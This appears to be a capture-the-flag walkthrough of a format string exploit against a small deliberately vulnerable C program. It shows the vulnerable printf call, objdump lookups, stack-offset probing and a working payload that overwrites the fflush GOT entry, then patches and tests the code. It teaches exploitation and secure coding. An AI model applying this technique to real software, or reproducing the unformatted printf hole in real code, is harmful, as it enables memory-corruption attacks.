Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

void fire_exit()
{
	printf("Oh look, a fire exit. That's why we are still under budget. Level Cleared \n");
}

void fun0()
{
	puts("Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.\n");
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);
	fflush(stdout);
}

int main()
{
	fun0();
}
```

So looking at this code, we see that the objective is to run the fire_exit function. However there isn't anywhere in the code that directly calls thay function. However after the insecure printf call, we can see a fflush() function call. We can craft a format string exploit to overwrite the address of the fflush variable with that of the fire_exit() function, thus when when the binary tries to run the fflush function it will just run the fire_exit() function. First thing we will need is the address of the fire_exit() function.

```
$ objdump -t f4 | grep fire_exit
0804853b g     F .text	00000019              fire_exit
```

So we now have the address of the fire_exit() function, which is 0x0804853b. Now we need to find the address of the fflush function. Since fflush is in libc (which is a shared library), we can view it in the dynamic relocation with objdump (using the -R flag).

```
$	objdump -R f4 | grep fflush
0804a010 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

So now we have the address of the fflush function, which is 0x804a010, we now need to find out where our input is stored on the stack. It shouldn't be too far away.

```
$	python -c 'print "0000" + ".%x"*20' | ./f4
Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.

0000.64.f7faf5a0.f0b5ff.ffffcffe.1.30303030.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
$	python -c 'print "0000" + "%6$x"' | ./f4
Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.

000030303030
```

So we now know our input is stored 6 DWORDS away. Let's try to overwrite the address of the fflush function without any regards as to what we overwrite it with, as a proof of concept.

```
$ python -c 'print "\x10\xa0\x04\x08" + "%6$n"' > payload
```

and now onto gdb

```
gdb-peda$ r < pwn_concept
```

One more wall of text later...

```
Stopped reason: SIGSEGV
0x00000004 in ?? ()
```

So we can see that the program tried to execute an instruction at the address 0x00000004, and because that is not a valid address we got the SIGSEV error. So we proved that we can overwrite the value, and since we only wrote a 32 hex bit address (which are only four bytes) printf wrote the decimal value 4 to the location since the -n flag will write for how many bytes we give it. To write the address we will need to, we will just need to take the address 0x0804853b, subtract 4 from it and write as many bytes as we get from that difference using the -x flag.

```
>>> 0x0804853b - 4
134513975
```

So we will need to write 134513975 bytes in order to get the write address. Let's try it!

```
$	python -c 'print "\x10\xa0\x04\x08" + "%134513975x" + "%6$n"' | ./f4
```

One wall of text later...

```
Oh look, a fire exit. That's why we are still under budget. Level Cleared 
```  

And just like that, we pwned the binary. Now let's patch it.

```
#include <stdlib.h>
#include <stdio.h>

void fire_exit()
{
	printf("Oh look, a fire exit. That's why we are still under budget. Level Cleared \n");
}

void fun0()
{
	puts("Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.\n");
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf("%s\n", buf0);
	fflush(stdout);
}

int main()
{
	fun0();
}
```

As you can see, the char array buf0 is now being formatted as a string when it's printed, so we should no longer be able to execute a format string exploit. Let's test it!

```
python -c 'print "%x.%x.%x.%x.%x"' | ./f4_secure 
Oh I almost forgot to mention, due to budget cuts we decided to get rud if tge exit. Just think of all of the security research we can do now!. And by we, I mean you.

%x.%x.%x.%x.%x
```

And just like that, we patched the binary!